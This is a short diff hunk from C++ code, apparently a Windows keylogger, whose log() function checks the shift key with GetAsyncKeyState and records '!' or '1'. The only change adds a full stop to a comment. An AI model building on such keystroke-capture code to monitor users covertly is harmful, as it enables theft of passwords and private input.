@@ -59,7 +59,7 @@ void log()
                     case 49: //ascii value for 1=49 
                    {
                      if (GetAsyncKeyState(0x10)) //Get state of the shift key 
-                         write << "!"; //Means if the shift key is pressed when the user types 1 then change it to !
+                         write << "!"; //Means if the shift key is pressed when the user types 1 then change it to !.
                      else
                        write << "1";
                    }
